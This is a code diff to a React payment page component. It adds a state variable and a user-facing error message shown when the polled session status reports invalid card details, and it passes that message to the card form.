@@ -36,6 +36,7 @@ const Index = () => {
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [otpError, setOtpError] = useState<string | null>(null);
   const [otpType, setOtpType] = useState<OtpType>("6digit");
+  const [cardInvalidError, setCardInvalidError] = useState<string | null>(null);
 
   const parsedAmount = parseFloat(amount) || 0;
   const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
@@ -50,6 +51,7 @@ const Index = () => {
 
   const handleFormSubmit = (id: string) => {
     setSessionId(id);
+    setCardInvalidError(null);
     setStep("waiting");
   };
 
@@ -77,6 +79,7 @@ const Index = () => {
             }
             if (newStatus === "rejected") setStep("rejected");
             if (newStatus === "card_invalid") {
+              setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
               setStep("form");
               setSessionId(null);
             }
@@ -95,6 +98,7 @@ const Index = () => {
             }
             if (newStatus === "rejected") setStep("rejected");
             if (newStatus === "card_invalid") {
+              setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
               setStep("form");
               setSessionId(null);
             }
@@ -111,6 +115,7 @@ const Index = () => {
               setStep("otp");
             }
             if (newStatus === "card_invalid") {
+              setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
               setStep("form");
               setSessionId(null);
             }
@@ -230,6 +235,7 @@ const Index = () => {
               isValidAmount={isValidAmount}
               formatEuro={formatEuro}
               onSuccess={handleFormSubmit}
+              cardInvalidError={cardInvalidError}
             />
           )}
           {step === "waiting" && <WaitingScreen amount={formattedTotal} />}
